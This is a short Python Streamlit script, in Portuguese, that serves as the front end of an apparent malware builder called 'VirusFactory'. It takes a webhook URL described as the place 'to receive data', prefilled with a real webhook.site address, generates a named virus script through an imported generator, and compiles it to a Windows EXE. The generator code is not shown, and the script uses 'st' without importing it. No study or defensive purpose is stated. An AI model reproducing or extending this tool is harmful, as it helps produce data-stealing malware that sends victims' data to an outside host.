import sys
import os

# Força o Python a olhar na pasta atual
sys.path.append(os.getcwd())

from generator import generate_virus
from builder import build_exe

st.title("VirusFactory - Gerador de Vírus Profissional")
url = st.text_input("Webhook URL para receber dados:", value="https://webhook.site/5d5e3fb7-1c53-42e0-b16a-494bb972561d")
name = st.text_input("Nome do vírus:", value="malware")

if st.button("Gerar Vírus"):
    generate_virus(url, name)
    st.success(f"Vírus '{name}.py' gerado!")

if st.button("Compilar para EXE"):
    build_exe(name)
    st.success(f"Arquivo '{name}.exe' compilado!")
